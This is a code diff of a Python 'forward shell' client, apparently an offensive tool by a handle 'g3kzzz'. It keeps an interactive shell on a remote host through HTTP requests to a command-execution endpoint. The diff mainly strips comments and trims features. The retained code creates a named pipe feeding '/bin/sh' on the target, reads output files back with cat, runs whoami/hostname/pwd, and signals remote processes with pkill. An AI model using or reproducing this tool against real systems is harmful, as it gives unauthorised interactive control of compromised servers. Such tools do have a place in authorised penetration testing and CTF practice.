@@ -6,7 +6,6 @@ Author: g3kzzz edition (final improvements)
 - Ensures arrow keys / line editing work:
     * Uses prompt_toolkit if available (recommended).
     * Falls back to Python readline (history & arrow keys) if prompt_toolkit is not installed.
-- Much faster interaction (lower polling and small stabilization window).
 - Ctrl-C sends SIGINT to the remote foreground process (without dropping the persistent shell).
 - Ctrl-L clears screen (prompt_toolkit and readline-compatible).
 - Clean English UI, no extra blank lines, minimal latency.
@@ -36,11 +35,10 @@ try:
 except Exception:
     USE_PROMPT_TOOLKIT = False
 
-# Try standard readline fallback for arrow keys / editing
 USE_READLINE = False
 if not USE_PROMPT_TOOLKIT:
     try:
-        import readline  # type: ignore
+        import readline
         USE_READLINE = True
     except Exception:
         USE_READLINE = False
@@ -53,17 +51,20 @@ BOLD = "\033[1m"
 RESET = "\033[0m"
 CLEAR = "\033[2J\033[H"
 
-TAG_RE = re.compile(r"<[^>]+>")
+HTML_TAGS = ["h1","h2","h3","b","i","strong","em","pre","div","span","p","br"]
+HTML_TAGS_RE = re.compile(r"</?(" + "|".join(HTML_TAGS) + r")[^>]*>", re.IGNORECASE)
 MARKER_RE = re.compile(r"^(__CTX_|__CMDSYNC_).*", re.M)
 
 def colorize(text: str, bold: bool = False) -> str:
     return f"{MAGENTA}{BOLD if bold else ''}{text}{RESET}"
 
 def strip_html(text: str) -> str:
+    """Elimina solo etiquetas HTML definidas, dejando todo lo demás intacto"""
     if not text:
         return ""
     text = text.replace("&nbsp;", " ")
-    return TAG_RE.sub("", text)
+    text = HTML_TAGS_RE.sub("", text)
+    return text
 
 def clean_output(text: str) -> str:
     if not text:
@@ -71,8 +72,6 @@ def clean_output(text: str) -> str:
     s = strip_html(text)
     lines = []
     for ln in s.splitlines():
-        if not ln.strip():
-            continue
         if MARKER_RE.match(ln):
             continue
         lines.append(ln.rstrip())
@@ -93,7 +92,7 @@ def load_cookies_file(path: str) -> dict:
     return cookies
 
 # --------------------
-# HTTP primitives (fast)
+# HTTP primitives
 # --------------------
 def send_request(session: requests.Session, url: str, payload: str, timeout: float = 4.0) -> str:
     try:
@@ -120,7 +119,7 @@ def read_file(session: requests.Session, url: str, path: str) -> str:
     return run_cmd(session, url, f"/bin/cat {path}")
 
 # --------------------
-# Reader: very responsive, small settle window
+# Reader thread
 # --------------------
 class Reader(threading.Thread):
     def __init__(self, session: requests.Session, url: str, stdout: str,
@@ -134,7 +133,7 @@ class Reader(threading.Thread):
         self._stop = threading.Event()
         self._suspend = threading.Event()
         self._lock = threading.Lock()
-        self.last = ""              # last filtered snapshot
+        self.last = ""
         self.printed_event = threading.Event()
 
     def run(self):
@@ -149,7 +148,6 @@ class Reader(threading.Thread):
                     time.sleep(self.interval)
                     continue
 
-                # stabilization window: collect small bursts
                 deadline = time.time() + self.settle
                 current = filtered
                 while time.time() < deadline:
@@ -159,7 +157,6 @@ class Reader(threading.Thread):
                         current = more
                         deadline = time.time() + self.settle
 
-                # compute delta/suffix to avoid re-printing everything when possible
                 delta = ""
                 if self.last and current.startswith(self.last):
                     delta = current[len(self.last):]
@@ -168,14 +165,12 @@ class Reader(threading.Thread):
 
                 delta = delta.strip("\n")
                 if delta:
-                    # print clean block (no extra leading blank lines)
                     with self._lock:
                         sys.stdout.write(delta + ("\n" if not delta.endswith("\n") else ""))
                         sys.stdout.flush()
                     self.printed_event.set()
                 self.last = current
             except Exception:
-                # fail silently and retry quickly
                 time.sleep(self.interval)
 
     def stop(self):
@@ -194,13 +189,12 @@ class Reader(threading.Thread):
         return self.printed_event.wait(timeout=timeout)
 
 # --------------------
-# Helpers for safe synchronous reads (use temp file on remote host)
+# Safe synchronous reads
 # --------------------
 def exec_to_tmp(session: requests.Session, url: str, stdin: str, cmd: str, timeout: float = 1.5) -> str:
     sid = randrange(100000, 999999)
     tmp = f"/dev/shm/ctx.{sid}"
     wrapped = f"({cmd}) > {tmp} 2>&1"
-    # write wrapped command to fifo so the persistent shell executes it (and writes to tmp)
     write_cmd(session, url, stdin, wrapped + "\n")
     deadline = time.time() + timeout
     out = ""
@@ -209,7 +203,6 @@ def exec_to_tmp(session: requests.Session, url: str, stdin: str, cmd: str, timeo
         out = read_file(session, url, tmp)
         if out and not out.startswith("[!] HTTP error"):
             break
-    # try cleanup remote tmp (best effort)
     try:
         run_cmd(session, url, f"/bin/rm -f {tmp}")
     except Exception:
@@ -220,7 +213,6 @@ def exec_to_tmp(session: requests.Session, url: str, stdin: str, cmd: str, timeo
 # Setup / cleanup remote FIFO shell
 # --------------------
 def setup_shell(session: requests.Session, url: str, stdin: str, stdout: str) -> None:
-    # mkfifo and start tail|sh in background; redirect stdout+stderr to stdout file
     cmd = f"/bin/rm -f {stdin} {stdout}; /bin/mkfifo {stdin}; /bin/touch {stdout}; /bin/tail -f {stdin} | /bin/sh > {stdout} 2>&1 &"
     run_cmd(session, url, cmd)
 
@@ -231,38 +223,27 @@ def cleanup(session: requests.Session, url: str, stdin: str, stdout: str) -> Non
         pass
 
 # --------------------
-# Send Ctrl-C to the remote **foreground** process (without killing the persistent sh)
-# Strategy:
-#  - Write ASCII 0x03 into the fifo (simulating Ctrl-C to the shell's stdin)
-#  - Also attempt to send SIGINT to the most recent child process of the persistent shell (best-effort)
-# Notes: behavior depends on remote environment; this combination maximizes chance to interrupt running job.
+# Ctrl-C handling
 # --------------------
 def send_remote_sigint(session: requests.Session, url: str, stdin: str) -> None:
     try:
-        # primary: write literal Ctrl-C to fifo
-        # Use printf to ensure raw control char is sent
         payload = 'printf "\\x03" > ' + stdin
         run_cmd(session, url, payload)
     except Exception:
         pass
     try:
-        # best-effort: send SIGINT to the newest descendant of the persistent shell (may require /bin/pgrep)
-        # This attempts to find processes whose parent is sh (or tail) - it's a heuristic and won't always work.
         run_cmd(session, url, "pidof sh >/dev/null 2>&1 && pgrep -n -P $(pidof sh) >/dev/null 2>&1 && pkill -SIGINT -n -P $(pidof sh) || true")
     except Exception:
         pass
 
 # --------------------
-# Get remote context (whoami, hostname, pwd) without touching shared stdout
+# Remote context
 # --------------------
 def get_remote_context(session: requests.Session, url: str, stdin: str, reader: Reader) -> tuple[str, str, str]:
     reader.suspend()
     try:
         out = exec_to_tmp(session, url, stdin, "whoami; hostname -s || hostname; pwd", timeout=1.2)
         parts = [p.strip() for p in (out or "").splitlines() if p.strip()]
-        if len(parts) >= 3:
-            return parts[0], parts[1], parts[2]
-        # fallback defaults
         while len(parts) < 3:
             parts.append("unknown")
         return parts[0], parts[1], parts[2]
@@ -270,25 +251,22 @@ def get_remote_context(session: requests.Session, url: str, stdin: str, reader: 
         reader.resume()
 
 # --------------------
-# Input helpers: prompt_toolkit or readline fallback
+# Input helpers
 # --------------------
 def make_prompt_session():
-    # Configure prompt_toolkit session with keybindings for Ctrl-L and Ctrl-C
     kb = KeyBindings()
     @kb.add("c-l")
     def _(event):
-        # clear screen
         print(CLEAR, end="")
     @kb.add("c-c")
     def _(event):
-        # allow our outer SIGINT handling to trigger; just raise KeyboardInterrupt in prompt so outer catches it
         event.app.exit(exception=KeyboardInterrupt, style="class:aborting")
     session = PromptSession(history=InMemoryHistory(), key_bindings=kb)
     return session
 
 def setup_readline_history():
     try:
-        import readline  # type: ignore
+        import readline
         histfile = os.path.expanduser("~/.g3kzzz_shell_history")
         try:
             readline.read_history_file(histfile)
@@ -296,39 +274,31 @@ def setup_readline_history():
             pass
         import atexit
         atexit.register(lambda: readline.write_history_file(histfile))
-        # Enable Ctrl-L to clear screen via readline (many readline configs handle Ctrl-L automatically)
     except Exception:
         pass
 
 # --------------------
-# Main interactive loop
+# Interactive loop
 # --------------------
 def interactive_loop(session: requests.Session, url: str, stdin: str, stdout: str, interval: float):
     reader = Reader(session, url, stdout, interval=interval, settle=max(0.02, interval/3))
     reader.start()
-
     def sigint_handler(sig, frame):
-        # don't exit the client; interrupt remote job
         send_remote_sigint(session, url, stdin)
-        # friendly message
         sys.stdout.write("\n[!] Sent SIGINT to remote process (use 'exit' to quit)\n")
         sys.stdout.flush()
-
     signal.signal(signal.SIGINT, sigint_handler)
 
-    # Setup input frontend
     if USE_PROMPT_TOOLKIT:
         p_session = make_prompt_session()
         prompt_func = lambda prompt_text: p_session.prompt(prompt_text)
     else:
-        # fallback: ensure readline history & basic arrow support
         if USE_READLINE:
             setup_readline_history()
         def prompt_func(prompt_text):
             try:
                 return input(prompt_text)
             except KeyboardInterrupt:
-                # translate to sending remote SIGINT (do not exit)
                 send_remote_sigint(session, url, stdin)
                 sys.stdout.write("\n[!] Sent SIGINT to remote process (use 'exit' to quit)\n")
                 sys.stdout.flush()
@@ -342,14 +312,10 @@ def interactive_loop(session: requests.Session, url: str, stdin: str, stdout: st
                 user, host, cwd = get_remote_context(session, url, stdin, reader)
             except Exception:
                 user, host, cwd = ("unknown", "unknown", "~")
-
-            # print header then prompt
             sys.stdout.write(colorize(f"[{user} ✘ {host}] - [{cwd}]\n", True))
             sys.stdout.flush()
             raw = prompt_func(colorize(">>> "))
-            if raw is None:
-                raw = ""
-            raw = raw.strip()
+            raw = (raw or "").strip()
             if not raw:
                 continue
             if raw.lower() in ("exit", "quit"):
@@ -363,50 +329,13 @@ def interactive_loop(session: requests.Session, url: str, stdin: str, stdout: st
                 sys.stdout.write(CLEAR)
                 sys.stdout.flush()
                 continue
-
-            # fast sync commands that should not go through the shared stdout
-            sync_cmds = {"whoami", "hostname", "pwd"}
-            first = raw.split()[0] if raw.split() else ""
-            if first in sync_cmds:
-                reader.suspend()
-                try:
-                    out = exec_to_tmp(session, url, stdin, raw, timeout=1.2)
-                    if out:
-                        # print straight away (no extra blank lines)
-                        sys.stdout.write(out.strip() + ("\n" if not out.strip().endswith("\n") else ""))
-                        sys.stdout.flush()
-                finally:
-                    reader.resume()
-                continue
-
-            # before sending command, clear printed_event so wait only for new output
             reader.clear_event()
-            # special handling for cd: write command to fifo so the persistent shell will update cwd
             if raw.startswith("cd"):
-                # write raw cd command to FIFO; then request pwd via temp file to get updated cwd
                 write_cmd(session, url, stdin, raw + "\n")
-                # small sleep to let the remote shell process cd
                 time.sleep(0.06)
-                # get new cwd via tmp
-                try:
-                    reader.suspend()
-                    out = exec_to_tmp(session, url, stdin, "pwd", timeout=0.8)
-                    if out:
-                        # update reader.last to include current remote stdout state so we avoid duplication
-                        # we do not force a print here; just update last snapshot
-                        reader.last = reader.last  # no-op but explicit
-                    finally_block = None
-                except Exception:
-                    pass
-                finally:
-                    reader.resume()
                 continue
-
-            # normal command: send to FIFO and wait for reader to print (or timeout)
             write_cmd(session, url, stdin, raw + "\n")
-            # wait for event - if the command produces output, reader will set event; otherwise we timeout
             _ = reader.wait_event(timeout=2.0)
-            # small stabilization pause for nice UX
             time.sleep(0.02)
     finally:
         try:
@@ -441,5 +370,4 @@ def main():
 
 if __name__ == "__main__":
     main()
-
 
